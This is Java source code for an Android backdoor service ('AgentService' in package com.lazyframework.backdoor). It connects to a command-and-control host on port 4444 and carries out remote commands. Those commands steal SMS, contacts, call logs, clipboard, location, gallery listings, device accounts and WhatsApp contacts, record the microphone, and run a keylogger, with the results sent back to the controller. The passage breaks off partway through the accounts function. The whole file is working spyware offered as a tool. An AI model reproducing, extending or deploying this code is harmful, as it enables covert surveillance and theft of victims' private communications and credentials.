package com.lazyframework.backdoor;

import android.app.Service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.view.WindowManager;
import android.widget.Toast;
import android.location.Location;
import android.location.LocationManager;
import android.content.ClipboardManager;
import android.content.ClipData;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.*;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class AgentService extends Service {
    private static final String TAG = "LazyFramework";
    private static final String C2_HOST = "192.168.1.8";
    private static final int C2_PORT = 4444;
    private static final String CHANNEL_ID = "agent_channel";

    // ==================== SOCKET ====================
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private AtomicBoolean isRunning = new AtomicBoolean(true);
    private AtomicBoolean isConnected = new AtomicBoolean(false);
    private Handler mainHandler;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;

    // ==================== THREAD POOLS ====================
    private ExecutorService commandExecutor = Executors.newFixedThreadPool(3);
    private ExecutorService responseExecutor = Executors.newSingleThreadExecutor();

    // ==================== CACHE ====================
    private Map<String, Boolean> permissionCache = new HashMap<>();
    private long lastPermissionCacheClear = 0;
    private static final long PERMISSION_CACHE_TTL = 60000; // 1 menit

    // ==================== MEDIA & INPUT ====================
    private MediaRecorder mediaRecorder;
    private String audioFilePath;
    private boolean isRecording = false;

    private StringBuilder keyLogs = new StringBuilder();
    private boolean isKeylogging = false;

    private String currentCommandId = null;

    // ==================== LIFECYCLE ====================

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🚀 Agent created");

        mainHandler = new Handler(Looper.getMainLooper());
        createNotificationChannel();
        startForeground(1, getNotification("Starting..."));

        backgroundThread = new HandlerThread("AgentThread");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());

        KeyloggerHelper.setAgentService(this);

        mainHandler.postDelayed(() -> {
            Log.d(TAG, "📡 Connecting...");
            connectToC2();
        }, 1000);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Agent", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification getNotification(String text) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("Agent")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .build();
        } else {
            return new Notification.Builder(this)
                    .setContentTitle("Agent")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .build();
        }
    }

    // ==================== CONNECT TO C2 ====================

    private void connectToC2() {
        backgroundHandler.post(() -> {
            while (isRunning.get() && !isConnected.get()) {
                try {
                    Log.d(TAG, "🔗 Connecting to " + C2_HOST + ":" + C2_PORT);
                    updateNotification("Connecting...");

                    socket = new Socket(C2_HOST, C2_PORT);
                    socket.setTcpNoDelay(true);
                    socket.setKeepAlive(true);
                    socket.setSoTimeout(30000);
                    socket.setReceiveBufferSize(65536);
                    socket.setSendBufferSize(65536);
                    socket.setReuseAddress(true);

                    out = new PrintWriter(socket.getOutputStream(), true);
                    in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                    isConnected.set(true);
                    sendBeacon();
                    
                    Log.d(TAG, "✅ Connected!");
                    updateNotification("Connected ✓");
                    showToast("Connected to C2!");

                    listenForCommands();

                } catch (Exception e) {
                    Log.e(TAG, "❌ Connection error: " + e.getMessage());
                    isConnected.set(false);
                    closeConnection();
                    try {
                        Thread.sleep(5000);
                    } catch (InterruptedException ignored) {}
                }
            }
        });
    }

    // ==================== SEND BEACON ====================

    private void sendBeacon() {
        try {
            JSONObject beacon = new JSONObject();
            beacon.put("type", "beacon");
            beacon.put("id", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
            beacon.put("device", android.os.Build.MODEL);
            beacon.put("android", android.os.Build.VERSION.RELEASE);
            beacon.put("manufacturer", android.os.Build.MANUFACTURER);
            beacon.put("timestamp", System.currentTimeMillis());

            if (out != null) {
                out.println(beacon.toString());
                Log.d(TAG, "📡 Beacon sent");
            }
        } catch (Exception e) {
            Log.e(TAG, "Beacon error", e);
        }
    }

    // ==================== LISTEN COMMANDS ====================

    private void listenForCommands() {
        backgroundHandler.post(() -> {
            try {
                String line;
                while (isRunning.get() && isConnected.get()) {
                    try {
                        line = in.readLine();
                        if (line == null) {
                            Log.w(TAG, "⚠️ Connection closed");
                            break;
                        }

                        line = line.trim();
                        if (line.isEmpty()) continue;

                        // Handle PING/PONG
                        if (line.equals("PING")) {
                            if (out != null) {
                                out.println("PONG");
                            }
                            continue;
                        }
                        if (line.equals("PONG")) {
                            continue;
                        }

                        Log.d(TAG, "📨 Received: " + line);

                        // ============================================================
                        // ASYNC EXECUTION - SOCKET TIDAK BLOCKED!
                        // ============================================================
                        commandExecutor.execute(() -> {
                            try {
                                String response = executeCommand(line);
                                if (response != null && !response.isEmpty()) {
                                    sendResponse(line, response);
                                }
                            } catch (Exception e) {
                                Log.e(TAG, "Async command error", e);
                            }
                        });

                    } catch (Exception e) {
                        Log.e(TAG, "❌ Read error: " + e.getMessage());
                        break;
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Listener error", e);
            }

            Log.d(TAG, "🔌 Listener stopped");
            isConnected.set(false);
            closeConnection();

            if (isRunning.get()) {
                mainHandler.postDelayed(this::connectToC2, 5000);
            }
        });
    }

    // ==================== SEND RESPONSE ====================

    private void sendResponse(String originalCommand, String result) {
        if (out == null || !isConnected.get()) {
            Log.w(TAG, "⚠️ Cannot send response");
            return;
        }

        responseExecutor.execute(() -> {
            try {
                String agentId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

                JSONObject response = new JSONObject();
                response.put("type", "response");
                response.put("agent_id", agentId);
                response.put("command", originalCommand.trim());
                response.put("timestamp", System.currentTimeMillis());

                if (currentCommandId != null) {
                    response.put("command_id", currentCommandId);
                    currentCommandId = null;
                }

                // Parse result
                try {
                    JSONObject resultObj = new JSONObject(result);
                    response.put("result", resultObj);
                } catch (JSONException e) {
                    response.put("result", result);
                }

                synchronized (out) {
                    out.println(response.toString());
                    Log.d(TAG, "📤 Response sent: " + originalCommand);
                }

            } catch (Exception e) {
                Log.e(TAG, "sendResponse error", e);
            }
        });
    }

    // ==================== COMMAND EXECUTOR ====================

    private String executeCommand(String commandLine) {
        String actualCommand = commandLine;

        try {
            JSONObject cmdJson = new JSONObject(commandLine);
            if (cmdJson.has("command")) {
                actualCommand = cmdJson.getString("command");
            }
            if (cmdJson.has("id")) {
                currentCommandId = cmdJson.getString("id");
            }
        } catch (JSONException e) {
            actualCommand = commandLine.trim();
        }

        Log.d(TAG, "⚡ Executing: " + actualCommand);
        return executeActualCommand(actualCommand);
    }

    private String executeActualCommand(String command) {
        try {
            switch (command) {
                case "GET_DEVICE_INFO": return getDeviceInfo();
                case "GET_LOCATION": return getLocation();
                case "GET_CLIPBOARD": return getClipboard();
                case "GET_INSTALLED_APPS": return getInstalledApps();
                case "GET_CONTACTS": return getContacts();
                case "GET_SMS": return getSMS();
                case "GET_CALL_LOGS": return getCallLogs();
                case "GET_GALLERY": return getGallery();
                case "GET_FILES_LIST": return getFilesList("/sdcard");
                case "RECORD_AUDIO": return recordAudio();
                case "STOP_RECORDING": return stopRecording();
                case "KEYLOG_START": return startKeylogger();
                case "KEYLOG_STOP": return stopKeylogger();
                case "KEYLOG_DUMP": return dumpKeylogs();
                case "WA_INFO": return getWhatsAppInfo();
                case "WA_CONTACTS": return getWhatsAppContacts();
                case "GET_ACCOUNTS": return getDeviceAccounts();
                case "GET_GOOGLE_ACCOUNTS": return getGoogleAccounts();
                case "SHOW_TOAST": 
                    showToast("Command executed!");
                    JSONObject toastResult = new JSONObject();
                    toastResult.put("status", "success");
                    toastResult.put("message", "Toast shown");
                    return toastResult.toString();
                case "HELP": return getHelp();
                default:
                    JSONObject unknown = new JSONObject();
                    unknown.put("status", "unknown");
                    unknown.put("command", command);
                    unknown.put("message", "Unknown command. Type HELP");
                    return unknown.toString();
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Command error: " + e.getMessage(), e);
            try {
                JSONObject error = new JSONObject();
                error.put("status", "error");
                error.put("message", e.getMessage());
                return error.toString();
            } catch (JSONException je) {
                return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
            }
        }
    }

    // ==================== PERMISSION HELPER ====================

    private boolean hasPermission(String permission) {
        // Clear cache jika sudah kadaluarsa
        if (System.currentTimeMillis() - lastPermissionCacheClear > PERMISSION_CACHE_TTL) {
            permissionCache.clear();
            lastPermissionCacheClear = System.currentTimeMillis();
        }

        if (!permissionCache.containsKey(permission)) {
            boolean granted = checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
            permissionCache.put(permission, granted);
        }
        return permissionCache.getOrDefault(permission, false);
    }

    // ==================== COMMAND IMPLEMENTATIONS ====================

    private String getDeviceInfo() {
        JSONObject info = new JSONObject();
        try {
            info.put("status", "success");
            info.put("model", android.os.Build.MODEL);
            info.put("manufacturer", android.os.Build.MANUFACTURER);
            info.put("android_version", android.os.Build.VERSION.RELEASE);
            info.put("sdk_version", android.os.Build.VERSION.SDK_INT);
            info.put("device_id", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
            info.put("battery", getBatteryPercentage());
            info.put("is_charging", isCharging());
            info.put("total_storage", getTotalStorage());
            info.put("free_storage", getFreeStorage());
            info.put("screen_resolution", getScreenResolution());
            info.put("timestamp", new Date().toString());
            return info.toString();
        } catch (JSONException e) {
            return "{\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    private String getLocation() {
        try {
            if (!hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) &&
                !hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("message", "Location permission not granted");
                return result.toString();
            }

            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) {
                JSONObject result = new JSONObject();
                result.put("status", "error");
                result.put("message", "LocationManager is null");
                return result.toString();
            }

            boolean isGPSEnabled = lm.isProviderEnabled(LocationManager.GPS_PROVIDER);
            boolean isNetworkEnabled = lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

            if (!isGPSEnabled && !isNetworkEnabled) {
                JSONObject result = new JSONObject();
                result.put("status", "error");
                result.put("message", "Location services disabled");
                return result.toString();
            }

            Location location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (location == null) {
                location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            }

            if (location != null) {
                JSONObject loc = new JSONObject();
                loc.put("status", "success");
                loc.put("latitude", location.getLatitude());
                loc.put("longitude", location.getLongitude());
                loc.put("accuracy", location.getAccuracy());
                loc.put("provider", location.getProvider());
                loc.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(location.getTime())));
                loc.put("maps_url", "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude());
                return loc.toString();
            }

            JSONObject result = new JSONObject();
            result.put("status", "error");
            result.put("message", "Location not available");
            return result.toString();

        } catch (Exception e) {
            return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
        }
    }

    private String getClipboard() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                if (clipboard != null && clipboard.hasPrimaryClip()) {
                    ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
                    if (item != null && item.getText() != null) {
                        JSONObject result = new JSONObject();
                        result.put("status", "success");
                        result.put("content", item.getText().toString());
                        return result.toString();
                    }
                }
            }
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("content", "Clipboard is empty");
            return result.toString();
        } catch (Exception e) {
            return "{\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    private String getInstalledApps() {
        JSONArray apps = new JSONArray();
        PackageManager pm = getPackageManager();
        List<android.content.pm.ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        for (android.content.pm.ApplicationInfo appInfo : packages) {
            try {
                if ((appInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0) continue;
                JSONObject app = new JSONObject();
                app.put("name", pm.getApplicationLabel(appInfo).toString());
                app.put("package", appInfo.packageName);
                apps.put(app);
            } catch (JSONException e) {
                Log.e(TAG, "App error", e);
            }
        }

        try {
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", apps.length());
            result.put("data", apps);
            return result.toString();
        } catch (JSONException e) {
            return apps.toString();
        }
    }

    private String getContacts() {
        JSONArray contacts = new JSONArray();
        Cursor cursor = null;

        try {
            if (!hasPermission(android.Manifest.permission.READ_CONTACTS)) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("message", "READ_CONTACTS permission not granted");
                return result.toString();
            }

            cursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                },
                null, null, 
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " LIMIT 100");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject contact = new JSONObject();
                    String name = getColumnValue(cursor, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                    String number = getColumnValue(cursor, ContactsContract.CommonDataKinds.Phone.NUMBER);
                    contact.put("name", name != null ? name : "");
                    contact.put("number", number != null ? number : "");
                    contacts.put(contact);
                } while (cursor.moveToNext());
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", contacts.length());
            result.put("data", contacts);
            return result.toString();

        } catch (Exception e) {
            return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    private String getSMS() {
        JSONArray messages = new JSONArray();
        Cursor cursor = null;

        try {
            if (!hasPermission(android.Manifest.permission.READ_SMS)) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("permission", "READ_SMS");
                return result.toString();
            }

            cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE},
                null, null, 
                Telephony.Sms.DATE + " DESC LIMIT 50");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject msg = new JSONObject();
                    String address = getColumnValue(cursor, Telephony.Sms.ADDRESS);
                    String body = getColumnValue(cursor, Telephony.Sms.BODY);
                    String date = getColumnValue(cursor, Telephony.Sms.DATE);

                    msg.put("from", address != null ? address : "");
                    msg.put("body", body != null ? body : "");
                    if (date != null) {
                        msg.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(Long.parseLong(date))));
                    }
                    messages.put(msg);
                } while (cursor.moveToNext());
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", messages.length());
            result.put("data", messages);
            return result.toString();

        } catch (Exception e) {
            return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    private String getCallLogs() {
        JSONArray calls = new JSONArray();
        Cursor cursor = null;

        try {
            if (!hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("permission", "READ_CALL_LOG");
                return result.toString();
            }

            cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{CallLog.Calls.NUMBER, CallLog.Calls.DURATION, CallLog.Calls.DATE, CallLog.Calls.TYPE},
                null, null, 
                CallLog.Calls.DATE + " DESC LIMIT 50");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject call = new JSONObject();
                    String number = getColumnValue(cursor, CallLog.Calls.NUMBER);
                    String duration = getColumnValue(cursor, CallLog.Calls.DURATION);
                    String date = getColumnValue(cursor, CallLog.Calls.DATE);
                    String type = getColumnValue(cursor, CallLog.Calls.TYPE);

                    call.put("number", number != null ? number : "");
                    call.put("duration", duration != null ? duration : "");
                    call.put("type", getCallType(type));
                    if (date != null) {
                        call.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(Long.parseLong(date))));
                    }
                    calls.put(call);
                } while (cursor.moveToNext());
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", calls.length());
            result.put("data", calls);
            return result.toString();

        } catch (Exception e) {
            return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    private String getCallType(String type) {
        if (type == null) return "Unknown";
        try {
            int t = Integer.parseInt(type);
            switch (t) {
                case CallLog.Calls.INCOMING_TYPE: return "Incoming";
                case CallLog.Calls.OUTGOING_TYPE: return "Outgoing";
                case CallLog.Calls.MISSED_TYPE: return "Missed";
                default: return "Unknown";
            }
        } catch (NumberFormatException e) {
            return "Unknown";
        }
    }

    private String getGallery() {
        JSONArray images = new JSONArray();
        Cursor cursor = null;

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE)) {
                    JSONObject result = new JSONObject();
                    result.put("status", "permission_denied");
                    result.put("message", "Storage permission denied");
                    return result.toString();
                }
            }

            cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATA,
                    MediaStore.Images.Media.DATE_TAKEN,
                    MediaStore.Images.Media.SIZE
                },
                null, null, 
                MediaStore.Images.Media.DATE_TAKEN + " DESC LIMIT 50");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject image = new JSONObject();
                    String name = getColumnValue(cursor, MediaStore.Images.Media.DISPLAY_NAME);
                    String path = getColumnValue(cursor, MediaStore.Images.Media.DATA);
                    String date = getColumnValue(cursor, MediaStore.Images.Media.DATE_TAKEN);
                    String size = getColumnValue(cursor, MediaStore.Images.Media.SIZE);

                    image.put("name", name != null ? name : "");
                    image.put("path", path != null ? path : "");
                    if (date != null) {
                        image.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(Long.parseLong(date))));
                    }
                    image.put("size", size != null ? formatFileSize(Long.parseLong(size)) : "0");
                    images.put(image);
                } while (cursor.moveToNext());
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", images.length());
            result.put("data", images);
            return result.toString();

        } catch (Exception e) {
            return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    private String getFilesList(String path) {
        JSONArray files = new JSONArray();
        try {
            File dir = new File(path);
            if (!dir.exists() || !dir.isDirectory()) {
                JSONObject result = new JSONObject();
                result.put("status", "error");
                result.put("message", "Path not found: " + path);
                return result.toString();
            }

            File[] fileList = dir.listFiles();
            if (fileList != null) {
                for (File file : fileList) {
                    try {
                        JSONObject fileInfo = new JSONObject();
                        fileInfo.put("name", file.getName());
                        fileInfo.put("path", file.getAbsolutePath());
                        fileInfo.put("is_directory", file.isDirectory());
                        fileInfo.put("size", file.length());
                        fileInfo.put("size_formatted", formatFileSize(file.length()));
                        fileInfo.put("last_modified", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                                .format(new Date(file.lastModified())));
                        files.put(fileInfo);
                    } catch (Exception ignored) {}
                }
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("path", path);
            result.put("count", files.length());
            result.put("data", files);
            return result.toString();

        } catch (Exception e) {
            return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
        }
    }

    // ==================== AUDIO RECORDING ====================

    private String recordAudio() {
        try {
            if (!hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("permission", "RECORD_AUDIO");
                return result.toString();
            }

            String audioDir = getExternalFilesDir(null).getAbsolutePath();
            File dir = new File(audioDir);
            if (!dir.exists()) dir.mkdirs();

            audioFilePath = audioDir + "/audio_" + System.currentTimeMillis() + ".3gp";

            if (mediaRecorder != null) {
                try {
                    if (isRecording) mediaRecorder.stop();
                    mediaRecorder.release();
                } catch (Exception e) {}
                mediaRecorder = null;
            }

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(audioFilePath);

            try {
                mediaRecorder.prepare();
            } catch (IOException e) {
                Log.e(TAG, "Prepare failed: " + e.getMessage());
                JSONObject error = new JSONObject();
                error.put("status", "error");
                error.put("message", "Failed to prepare recorder");
                return error.toString();
            }

            mediaRecorder.start();
            isRecording = true;

            Log.d(TAG, "🎤 Recording started: " + audioFilePath);

            final Handler stopHandler = new Handler(Looper.getMainLooper());
            stopHandler.postDelayed(() -> {
                if (isRecording) {
                    backgroundHandler.post(() -> {
                        String result = stopRecording();
                        Log.d(TAG, "Auto-stop result: " + result);
                    });
                }
            }, 30000);

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("message", "Recording started (30 seconds auto-stop)");
            result.put("file", audioFilePath);
            return result.toString();

        } catch (Exception e) {
            Log.e(TAG, "Record audio error: " + e.getMessage(), e);
            return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
        }
    }

    private String stopRecording() {
        try {
            if (mediaRecorder != null && isRecording) {
                try {
                    mediaRecorder.stop();
                    Log.d(TAG, "⏹️ Recording stopped: " + audioFilePath);
                } catch (RuntimeException e) {
                    Log.e(TAG, "Stop error: " + e.getMessage());
                }
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;

                File audioFile = new File(audioFilePath);
                if (audioFile.exists() && audioFile.length() > 0) {
                    return downloadFile(audioFilePath);
                } else {
                    JSONObject result = new JSONObject();
                    result.put("status", "error");
                    result.put("message", "No audio data recorded");
                    return result.toString();
                }
            }

            JSONObject result = new JSONObject();
            result.put("status", "info");
            result.put("message", "No active recording");
            return result.toString();

        } catch (Exception e) {
            return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
        }
    }

    // ==================== KEYLOGGER ====================

    private String startKeylogger() {
        isKeylogging = true;
        keyLogs.append("=== KEYLOGGER STARTED AT ").append(new Date()).append(" ===\n");

        Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);

        mainHandler.post(() -> Toast.makeText(AgentService.this, "Keylogger started", Toast.LENGTH_LONG).show());

        JSONObject result = new JSONObject();
        try {
            result.put("status", "success");
            result.put("message", "Keylogger started");
            return result.toString();
        } catch (JSONException e) {
            return "{\"status\":\"success\",\"message\":\"Keylogger started\"}";
        }
    }

    private String stopKeylogger() {
        isKeylogging = false;
        keyLogs.append("=== KEYLOGGER STOPPED AT ").append(new Date()).append(" ===\n");

        mainHandler.post(() -> Toast.makeText(AgentService.this, "Keylogger stopped", Toast.LENGTH_SHORT).show());

        JSONObject result = new JSONObject();
        try {
            result.put("status", "success");
            result.put("message", "Keylogger stopped");
            return result.toString();
        } catch (JSONException e) {
            return "{\"status\":\"success\",\"message\":\"Keylogger stopped\"}";
        }
    }

    private String dumpKeylogs() {
        String logs = keyLogs.toString();
        keyLogs.setLength(0);
        keyLogs.append("=== NEW SESSION STARTED ===\n");

        try {
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("logs", logs);
            result.put("length", logs.length());
            result.put("timestamp", new Date().toString());
            return result.toString();
        } catch (JSONException e) {
            return "{\"logs\":\"" + logs.replace("\"", "\\\"") + "\"}";
        }
    }

    public void onKeyLogged(String text) {
        if (!isKeylogging || text == null || text.isEmpty()) return;

        String timestamp = new SimpleDateFormat("HH:mm:ss").format(new Date());
        String logEntry = "[" + timestamp + "] " + text + "\n";

        synchronized (keyLogs) {
            keyLogs.append(logEntry);
            if (keyLogs.length() > 500000) {
                keyLogs.delete(0, 250000);
            }
        }

        Log.d(TAG, "📝 Keylogged: " + text.substring(0, Math.min(50, text.length())));
    }

    // ==================== WHATSAPP ====================

    private String getWhatsAppInfo() {
        JSONObject result = new JSONObject();
        try {
            PackageManager pm = getPackageManager();
            android.content.pm.PackageInfo waInfo = pm.getPackageInfo("com.whatsapp", 0);

            result.put("status", "success");
            result.put("installed", true);
            result.put("package_name", "com.whatsapp");
            result.put("version_name", waInfo.versionName);
            result.put("version_code", waInfo.versionCode);
            result.put("first_install_time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                    .format(new Date(waInfo.firstInstallTime)));
            result.put("last_update_time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                    .format(new Date(waInfo.lastUpdateTime)));

        } catch (PackageManager.NameNotFoundException e) {
            try {
                result.put("status", "success");
                result.put("installed", false);
                result.put("message", "WhatsApp is not installed");
            } catch (JSONException je) {
                return "{\"status\":\"error\",\"message\":\"JSON error\"}";
            }
        } catch (JSONException e) {
            return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
        }
        return result.toString();
    }

    private String getWhatsAppContacts() {
        JSONObject result = new JSONObject();
        JSONArray waContacts = new JSONArray();
        Cursor cursor = null;

        try {
            if (!hasPermission(android.Manifest.permission.READ_CONTACTS)) {
                result.put("status", "error");
                result.put("message", "READ_CONTACTS permission denied");
                return result.toString();
            }

            cursor = getContentResolver().query(
                ContactsContract.RawContacts.CONTENT_URI,
                new String[]{ContactsContract.RawContacts.CONTACT_ID, ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY},
                ContactsContract.RawContacts.ACCOUNT_TYPE + " = ?",
                new String[]{"com.whatsapp"},
                null
            );

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject contact = new JSONObject();
                    String contactId = getColumnValue(cursor, ContactsContract.RawContacts.CONTACT_ID);
                    String name = getColumnValue(cursor, ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY);
                    String waNumber = getWhatsAppNumber(contactId);

                    contact.put("name", name != null ? name : "");
                    contact.put("whatsapp_number", waNumber);
                    contact.put("contact_id", contactId != null ? contactId : "");
                    waContacts.put(contact);

                } while (cursor.moveToNext());
            }

            result.put("status", "success");
            result.put("type", "whatsapp_contacts");
            result.put("count", waContacts.length());
            result.put("data", waContacts);

        } catch (Exception e) {
            try {
                result.put("status", "error");
                result.put("message", e.getMessage());
            } catch (JSONException je) {
                return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
            }
        } finally {
            if (cursor != null) cursor.close();
        }
        return result.toString();
    }

    private String getWhatsAppNumber(String contactId) {
        Cursor dataCursor = null;
        String result = "";
        try {
            dataCursor = getContentResolver().query(
                ContactsContract.Data.CONTENT_URI,
                new String[]{ContactsContract.Data.DATA1, ContactsContract.Data.DATA3},
                ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?",
                new String[]{contactId, "vnd.android.cursor.item/vnd.com.whatsapp.profile"},
                null
            );

            if (dataCursor != null && dataCursor.moveToFirst()) {
                int idx = dataCursor.getColumnIndex(ContactsContract.Data.DATA3);
                if (idx >= 0) result = dataCursor.getString(idx);
                if (result == null || result.isEmpty()) {
                    idx = dataCursor.getColumnIndex(ContactsContract.Data.DATA1);
                    if (idx >= 0) result = dataCursor.getString(idx);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting WA number: " + e.getMessage());
        } finally {
            if (dataCursor != null) dataCursor.close();
        }
        return result != null ? result : "";
    }

    // ==================== ACCOUNTS ====================

    private String getDeviceAccounts() {
        try {
            if (!hasPermission(android.Manifest.permission.GET_ACCOUNTS)) {
                JSONObject result = new JSONObject();
                result.put("status", "permission_denied");
                result.put("message", "GET_ACCOUNTS permission not granted");
                return result.toString();
            }

            AccountManager accountManager = AccountManager.get(this);
            if (accountManager == null) {
                JSONObject result = new JSONObject();
                result.put("status", "error");
                result.put("message", "AccountManager is null");
                return result.toString();
            }

            Account[] accounts = accountManager.getAccounts();
            JSONArray accountsArray = new JSONArray();
            Set<String> uniqueAccounts = new HashSet<>();

            for (Account account : accounts) {
                String accountKey = account.type + ":" + account.name;
                if (uniqueAccounts.contains(accountKey)) continue;
                uniqueAccounts.add(accountKey);

                JSONObject accObj = new JSONObject();
                accObj.put("name", account.name);
                accObj.put("type", account.type);
                accObj.put("type_description", getAccountTypeDescription(account.type));
                accountsArray.put(accObj);
            }

            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("count", accountsArray.length());
            result.put("data", accountsArray);
            return result.toString();

